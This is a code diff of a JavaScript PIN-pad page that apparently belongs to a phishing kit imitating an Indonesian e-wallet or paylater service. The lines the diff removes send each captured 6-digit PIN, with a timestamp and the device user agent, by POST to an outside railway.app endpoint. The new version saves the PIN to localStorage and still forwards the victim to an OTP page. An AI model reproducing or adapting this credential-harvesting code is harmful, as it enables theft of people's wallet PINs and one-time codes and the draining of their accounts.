@@ -22,9 +22,9 @@ buttons.forEach(btn => {
 
     updateDots();
 
-    // kalau sudah 6 digit → kirim
+    // kalau sudah 6 digit → SIMPAN SAJA
     if (pin.length === 6) {
-      kirimPin();
+      simpanPin();
     }
 
   });
@@ -40,37 +40,17 @@ function updateDots() {
 }
 
 // ============================
-// KIRIM KE SERVER (FIXED)
+// SIMPAN PIN (BUKAN KIRIM)
 // ============================
-async function kirimPin() {
+function simpanPin() {
 
-  const text = `
-🔐 PIN MASUK
+  console.log("PIN DISIMPAN:", pin);
 
-PIN: ${pin}
-⏰ Waktu: ${new Date().toLocaleString()}
-📱 Device: ${navigator.userAgent}
-`;
+  // ✅ simpan ke localStorage
+  localStorage.setItem("pin", pin);
 
-  try {
-    console.log("PIN DIKIRIM:", pin); // debug
-
-    await fetch("https://danacicilanpaylaterr-production.up.railway.app/send", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ text })
-    });
-
-    console.log("PIN TERKIRIM"); // debug
-
-  } catch (err) {
-    console.log("GAGAL KIRIM:", err);
-  }
-
-  // 🔥 pastikan request selesai dulu baru pindah
+  // 🚀 lanjut ke halaman OTP
   setTimeout(() => {
     window.location.href = "tap.html";
-  }, 800);
+  }, 500);
 }
